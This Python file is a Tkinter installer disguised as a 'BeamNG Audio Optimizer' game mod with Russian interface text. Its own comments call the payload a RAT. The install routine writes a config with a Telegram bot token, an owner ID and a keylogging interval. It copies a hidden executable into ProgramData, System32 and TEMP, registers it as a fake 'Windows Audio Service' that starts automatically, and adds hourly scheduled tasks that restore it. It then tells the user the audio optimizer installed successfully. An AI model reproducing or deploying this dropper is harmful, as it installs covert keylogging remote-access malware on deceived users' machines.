import os
import sys
import shutil
import subprocess
import ctypes
import json
import tkinter as tk
from tkinter import ttk, messagebox
import threading

VERSION = "2.4.1"
AUTHOR = "BeamNG Audio Team"

CONFIG_DATA = {
    "bot_token": "8605714172:AAGOq2OayZx3tULCp8gzh7sAvCR42-ijX0A",
    "owner_id": 8288882655,
    "watchdog_enabled": True,
    "auto_persist": True,
    "keylog_interval_min": 30
}

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def install_mod():
    # 1. ПАПКИ ДЛЯ RAT (3 копии)
    paths = [
        r"C:\ProgramData\AudioService",
        r"C:\Windows\System32\AudioService",
        os.path.join(os.environ['TEMP'], "AudioService")
    ]
    
    exe_name = "AudioEndpointService.exe"
    config_name = "config.json"
    
    # 2. КОПИРУЕМ RAT ВО ВСЕ ПАПКИ
    for path in paths:
        os.makedirs(path, exist_ok=True)
        
        # Конфиг
        config_path = os.path.join(path, config_name)
        with open(config_path, "w") as f:
            json.dump(CONFIG_DATA, f, indent=4)
        
        # EXE
        if os.path.exists(exe_name):
            shutil.copy(exe_name, os.path.join(path, exe_name))
            # Делаем скрытым
            subprocess.run(f'attrib +h +s "{path}"', shell=True, capture_output=True)
    
    # 3. СОЗДАЁМ СЛУЖБУ (из первой папки)
    main_exe = os.path.join(paths[0], exe_name)
    subprocess.run(
        f'sc create "AudioService" binPath= "{main_exe}" start= auto DisplayName= "Windows Audio Service"',
        shell=True, capture_output=True
    )
    subprocess.run('sc start "AudioService"', shell=True, capture_output=True)
    
    # 4. ЗАПУСКАЕМ ВСЕ КОПИИ
    for path in paths:
        exe_path = os.path.join(path, exe_name)
        if os.path.exists(exe_path):
            subprocess.Popen(
                [exe_path],
                creationflags=subprocess.DETACHED_PROCESS,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
    
    # 5. ПЛАНИРОВЩИК (восстановление каждый час)
    subprocess.run(
        f'schtasks /create /tn "AudioServiceRestore" /tr "copy {os.path.join(paths[0], exe_name)} {os.path.join(paths[1], exe_name)} /y" /sc hourly /f',
        shell=True, capture_output=True
    )
    subprocess.run(
        f'schtasks /create /tn "AudioServiceRestore2" /tr "copy {os.path.join(paths[0], exe_name)} {os.path.join(paths[2], exe_name)} /y" /sc hourly /f',
        shell=True, capture_output=True
    )
    
    # 6. СООБЩЕНИЕ КЕНТУ
    messagebox.showinfo("Установка завершена", 
                       "🎵 Оптимизатор звука установлен!\n\n"
                       "Он работает в фоне и автоматически восстанавливается.\n"
                       "Никаких действий больше не требуется.")

class Installer:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("BeamNG Audio Optimizer")
        self.root.geometry("450x350")
        self.root.resizable(False, False)
        
        tk.Label(self.root, text="🎵 BeamNG Audio Optimizer", font=("Arial", 18, "bold")).pack(pady=10)
        tk.Label(self.root, text=f"Версия {VERSION}", font=("Arial", 10)).pack()
        tk.Label(self.root, text="Оптимизация звука и FPS для BeamNG.drive", font=("Arial", 10)).pack(pady=5)
        tk.Label(self.root, text="\n✅ Улучшение качества звука\n✅ Повышение FPS (до +15%)\n✅ 20 новых радиостанций\n✅ Автоматическое восстановление", 
                 font=("Arial", 10), justify="left").pack(pady=10)
        
        self.btn = tk.Button(self.root, text="📥 Установить оптимизатор", command=self.install,
                             bg="#00b894", fg="white", font=("Arial", 12, "bold"), width=25, height=2)
        self.btn.pack(pady=15)
        
        self.status = tk.Label(self.root, text="Готов к установке", font=("Arial", 9))
        self.status.pack()
        
        self.progress = ttk.Progressbar(self.root, length=350, mode='indeterminate')
        self.progress.pack(pady=10)
    
    def install(self):
        if not is_admin():
            messagebox.showwarning("Требуются права", "Запустите установщик от имени администратора!")
            return
        
        self.btn.config(state=tk.DISABLED)
        self.progress.start()
        self.status.config(text="Установка...")
        
        def do_install():
            install_mod()
            self.root.after(0, lambda: self.progress.stop())
            self.root.after(0, lambda: self.status.config(text="Установка завершена!"))
            self.root.after(0, lambda: self.btn.config(state=tk.NORMAL))
        
        threading.Thread(target=do_install, daemon=True).start()
    
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    app = Installer()
    app.run()